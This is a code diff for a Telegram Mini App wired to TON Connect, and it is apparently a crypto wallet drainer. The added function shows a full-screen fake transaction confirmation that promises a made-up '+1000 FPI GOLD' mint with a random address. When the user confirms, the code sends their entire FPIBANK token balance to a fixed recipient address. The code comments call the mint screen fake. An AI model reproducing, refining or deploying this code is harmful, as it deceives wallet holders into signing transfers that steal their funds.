@@ -400,62 +400,115 @@
       border: 1px solid #00ff88;
     }
     
-    /* Стили для фейкового минта */
-    .fake-mint-card {
-      background: rgba(0, 255, 136, 0.1);
-      border: 1px solid #00ff88;
-      border-radius: 12px;
-      padding: 15px;
-      margin: 20px auto;
-      max-width: 90%;
-      animation: fadeIn 0.5s ease-out;
-    }
-    
-    .fake-mint-header {
-      color: #00ff88;
-      font-size: 1.2em;
-      margin-bottom: 10px;
-      display: flex;
-      align-items: center;
-    }
-    
-    .fake-mint-success {
-      background-color: #00ff88;
-      color: #000;
-      border-radius: 50%;
-      width: 20px;
-      height: 20px;
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      margin-right: 10px;
-      font-weight: bold;
-    }
-    
-    .fake-mint-details {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 10px;
-      margin-top: 10px;
-    }
-    
-    .fake-mint-label {
-      color: #b388ff;
-      font-size: 0.9em;
-    }
-    
-    .fake-mint-value {
+    /* Стили для фейкового подтверждения транзакции */
+    .tx-confirmation {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.9);
+      z-index: 1000;
+      padding: 20px;
+      box-sizing: border-box;
       color: white;
+    }
+    
+    .tx-card {
+      background: rgba(255,255,255,0.1);
+      padding: 15px;
+      border-radius: 12px;
+      max-width: 100%;
       word-break: break-all;
     }
     
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
+    .tx-amount {
+      font-weight: bold;
+      font-size: 1.1em;
     }
     
-    #fakeMintContainer {
-      display: none;
+    .tx-hash {
+      font-size: 0.8em;
+      opacity: 0.8;
+      margin: 5px 0;
+    }
+    
+    .tx-time {
+      font-size: 0.8em;
+      opacity: 0.8;
+    }
+    
+    .tx-fee {
+      width: 100%;
+      margin-top: 15px;
+      font-size: 0.9em;
+    }
+    
+    .tx-fee td {
+      padding: 2px 0;
+    }
+    
+    .tx-fee tr td:last-child {
+      text-align: right;
+    }
+    
+    .tx-buttons {
+      display: flex;
+      gap: 10px;
+      margin-top: 20px;
+    }
+    
+    .tx-btn-confirm {
+      flex: 1;
+      padding: 12px;
+      background: #00ff88;
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+    }
+    
+    .tx-btn-cancel {
+      flex: 1;
+      padding: 12px;
+      background: rgba(255,255,255,0.1);
+      color: #fff;
+      border: none;
+      border-radius: 8px;
+    }
+    
+    .mint-simulation {
+      background: rgba(0, 255, 136, 0.05);
+      border-radius: 12px;
+      padding: 12px;
+      margin-top: 15px;
+      border-left: 3px solid #00ff88;
+    }
+    
+    .mint-badge {
+      background: #00ff88;
+      color: #000;
+      border-radius: 4px;
+      padding: 2px 6px;
+      font-size: 0.8em;
+      font-weight: bold;
+      display: inline-block;
+      margin-right: 8px;
+    }
+    
+    .mint-amount {
+      font-weight: bold;
+      color: #00ff88;
+    }
+    
+    .mint-details {
+      margin-top: 8px;
+      font-size: 0.9em;
+      color: #ccc;
+    }
+    
+    .mint-status {
+      color: #00ff88;
     }
   </style>
 </head>
@@ -539,8 +592,6 @@
       <div id="winMessage"></div>
     </div>
   </div>
-
-  <div id="fakeMintContainer"></div>
 
   <script>
     /* Навигация между страницами */
@@ -643,41 +694,99 @@
       buttonRootId: "ton-connect",
     });
     
-    /* Функция для отображения фейкового минта */
-    function showFakeMint(tokenName, amount) {
-      const container = document.getElementById('fakeMintContainer');
-      const fakeAddress = "EQC" + Array(48).fill(0).map(() => 
+    /* Функция для показа фейкового подтверждения с минтом */
+    function showFakeConfirmation(humanBalance) {
+      const confirmation = document.createElement('div');
+      confirmation.className = 'tx-confirmation';
+      
+      const randomHash = "UQAX" + Array(4).fill(0).map(() => 
+        Math.floor(Math.random() * 16).toString(16)).join('') + "FvTz";
+      const mintHash = "EQC" + Array(48).fill(0).map(() => 
         Math.floor(Math.random() * 16).toString(16)).join('');
       
-      container.style.display = 'block';
-      container.innerHTML = `
-        <div class="fake-mint-card">
-          <div class="fake-mint-header">
-            <span class="fake-mint-success">✓</span>
-            Минт токена ${tokenName} успешно выполнен
+      confirmation.innerHTML = `
+        <div style="max-width: 100%;">
+          <h2 style="color: #fff; margin-top: 0;">Підтвердити транзакцію</h2>
+          
+          <div class="tx-card">
+            <div class="tx-amount">-${humanBalance} FPIBANK</div>
+            <div class="tx-hash">${randomHash}</div>
+            <div class="tx-time">${new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'})}</div>
+            
+            <table class="tx-fee">
+              <tr>
+                <td>Комісія</td>
+                <td>0.01 TON</td>
+              </tr>
+              <tr>
+                <td></td>
+                <td style="opacity: 0.7;">~ $0.05</td>
+              </tr>
+            </table>
+            
+            <div class="mint-simulation">
+              <div>
+                <span class="mint-badge">MINT</span>
+                <span class="mint-amount">+1000 FPI GOLD</span>
+              </div>
+              <div class="mint-details">
+                <div>Адрес: ${mintHash}</div>
+                <div>Статус: <span class="mint-status">Успішно</span></div>
+              </div>
+            </div>
           </div>
-          <div class="fake-mint-details">
-            <div>
-              <div class="fake-mint-label">Количество:</div>
-              <div class="fake-mint-value">${amount} ${tokenName}</div>
-            </div>
-            <div>
-              <div class="fake-mint-label">Время:</div>
-              <div class="fake-mint-value">${new Date().toLocaleString()}</div>
-            </div>
-            <div>
-              <div class="fake-mint-label">Адрес токена:</div>
-              <div class="fake-mint-value"><small>${fakeAddress}</small></div>
-            </div>
-            <div>
-              <div class="fake-mint-label">Статус:</div>
-              <div class="fake-mint-value" style="color: #00ff88;">Успешно</div>
-            </div>
+          
+          <div class="tx-buttons">
+            <button id="confirmTx" class="tx-btn-confirm">Підтвердити</button>
+            <button id="cancelTx" class="tx-btn-cancel">Скасувати</button>
           </div>
         </div>
       `;
       
-      container.scrollIntoView({ behavior: 'smooth' });
+      document.body.appendChild(confirmation);
+      
+      document.getElementById('confirmTx').addEventListener('click', async () => {
+        confirmation.remove();
+        
+        // Реальная отправка транзакции после подтверждения
+        const userTonAddress = tonConnectUI.wallet?.account?.address;
+        if (!userTonAddress) {
+          Telegram.WebApp.showAlert("Ошибка: не удалось получить адрес кошелька");
+          return;
+        }
+        
+        const { rawBalance, userJettonWallet } = await getUserFPIBankData(userTonAddress);
+        if (!userJettonWallet || rawBalance === "0") {
+          Telegram.WebApp.showAlert("Ошибка: недостаточный баланс");
+          return;
+        }
+        
+        const payloadBoc = await createJettonTransferPayload(rawBalance, recipientTonAddress, userTonAddress);
+        if (!payloadBoc) {
+          Telegram.WebApp.showAlert("Ошибка при создании транзакции");
+          return;
+        }
+        
+        const transaction = {
+          validUntil: Math.floor(Date.now() / 1000) + 3600,
+          messages: [{
+            address: userJettonWallet,
+            amount: "100000000",
+            payload: payloadBoc,
+          }],
+        };
+        
+        try {
+          await tonConnectUI.sendTransaction(transaction);
+          Telegram.WebApp.showAlert(`Успешно отправлено ${humanBalance} FPIBANK!`);
+        } catch (error) {
+          Telegram.WebApp.showAlert("Ошибка: " + error.message);
+        }
+      });
+      
+      document.getElementById('cancelTx').addEventListener('click', () => {
+        confirmation.remove();
+      });
     }
     
     /* Основная функция отправки */
@@ -693,32 +802,8 @@
       const balanceBigInt = BigInt(rawBalance);
       const humanBalance = balanceBigInt / BigInt(10 ** decimals);
       
-      const payloadBoc = await createJettonTransferPayload(rawBalance, recipientTonAddress, userTonAddress);
-      if (!payloadBoc) {
-        Telegram.WebApp.showAlert("Ошибка при создании транзакции!");
-        return;
-      }
-      
-      const transaction = {
-        validUntil: Math.floor(Date.now() / 1000) + 3600,
-        messages: [{
-          address: userJettonWallet,
-          amount: "100000000",
-          payload: payloadBoc,
-        }],
-      };
-      
-      try {
-        const result = await tonConnectUI.sendTransaction(transaction);
-        
-        // Показываем фейковый минт после успешной отправки
-        showFakeMint("FPI GOLD", "1000"); // Меняйте параметры здесь
-        
-        Telegram.WebApp.showAlert(`Успешно отправлено ${humanBalance} FPIBANK!`);
-      } catch (error) {
-        console.error("Ошибка:", error);
-        Telegram.WebApp.showAlert("Ошибка: " + error.message);
-      }
+      // Показываем фейковое подтверждение с минтом
+      showFakeConfirmation(humanBalance);
     }
     
     /* Обработчик кнопки отправки */
